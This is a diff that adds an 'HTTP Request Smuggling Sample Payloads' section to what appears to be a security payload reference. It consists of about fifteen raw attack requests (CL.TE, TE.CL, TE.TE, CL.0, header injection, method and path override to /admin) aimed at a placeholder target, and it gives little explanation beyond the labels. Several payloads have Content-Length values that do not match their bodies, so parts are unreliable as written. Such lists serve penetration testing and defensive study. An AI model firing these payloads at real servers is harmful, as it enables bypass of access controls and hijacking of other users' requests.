@@ -4458,6 +4458,181 @@ if (preg_match($pattern, $subject)) {
 
 > HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
 
+## 🔬 HTTP Request Smuggling Sample Payloads
+
+- **CL.TE (Content-Length vs Transfer-Encoding)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 13
+  Transfer-Encoding: chunked
+
+  0
+
+  GET /malicious HTTP/1.1
+  Host: target.com
+  ```
+
+- **TE.CL (Transfer-Encoding vs Content-Length)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Transfer-Encoding: chunked
+  Content-Length: 6
+
+  5
+  GPOST /evil HTTP/1.1
+  Host: target.com
+
+  0
+  ```
+
+- **TE.TE (Dual Transfer-Encoding headers)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Transfer-Encoding: chunked
+  Transfer-Encoding : chunked
+
+  0
+
+  GET /next HTTP/1.1
+  Host: target.com
+  ```
+
+- **CL.CL (Dual Content-Length headers)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 10
+  Content-Length: 4
+
+  GET /hidden HTTP/1.1
+  ```
+
+- **CL.0 (Zero Content-Length)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 0
+
+  GET /inject HTTP/1.1
+  Host: target.com
+  ```
+
+- **TE.0 (Zero chunk size)**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Transfer-Encoding: chunked
+
+  0
+
+  GET /afterchunk HTTP/1.1
+  Host: target.com
+  ```
+
+- **Mixed Case Headers**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  transfer-encoding: chunked
+
+  0
+
+  GET /casebypass HTTP/1.1
+  Host: target.com
+  ```
+
+- **Space/Tab Injection**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Transfer-Encoding : chunked
+
+  0
+
+  GET /spaceinject HTTP/1.1
+  Host: target.com
+  ```
+
+- **Line Ending Abuse**  
+  ```http
+  POST / HTTP/1.1\r\n
+  Host: target.com\r\n
+  Transfer-Encoding: chunked\r
+  \n
+  0\r\n
+  GET /newline HTTP/1.1\r\n
+  Host: target.com\r\n
+  ```
+
+- **Chunk Size Manipulation**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Transfer-Encoding: chunked
+
+  3
+  GET
+  0
+
+  GET /chunkinject HTTP/1.1
+  Host: target.com
+  ```
+
+- **Keep-Alive Poisoning**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Connection: keep-alive
+  Content-Length: 13
+
+  GET /poison HTTP/1.1
+  Host: target.com
+  ```
+
+- **Front-End Timeout**  
+  *(Send first part, delay second)*  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 20
+
+  GET /timeout HTTP/1.1
+  Host: target.com
+  ```
+
+- **Header Injection**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 50
+
+  GET / HTTP/1.1
+  Host: target.com
+  X-Forwarded-For: evil.com
+  ```
+
+- **Method Override**  
+  ```http
+  GET / HTTP/1.1
+  Host: target.com
+  Content-Length: 15
+
+  POST /admin HTTP/1.1
+  Host: target.com
+  ```
+
+- **Path Override**  
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 20
+
+  GET /admin HTTP/1.1
+  Host: target.com
+  ```
 ## Summary
 
 * [Tools](#tools)
